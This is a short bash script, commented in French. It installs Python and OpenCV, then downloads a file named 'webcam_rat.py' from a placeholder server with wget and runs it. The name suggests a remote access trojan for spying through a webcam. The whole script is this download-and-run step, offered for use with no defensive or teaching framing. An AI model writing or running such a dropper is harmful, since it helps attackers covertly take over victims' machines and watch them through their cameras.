#!/bin/bash

# Télécharger les dépendances
apt-get update
apt-get install -y python3 python3-opencv python3-pip
pip3 install opencv-python

# Télécharger le script Python
wget -O webcam_rat.py https://votre-serveur/webcam_rat.py

# Exécuter le script Python
python3 webcam_rat.py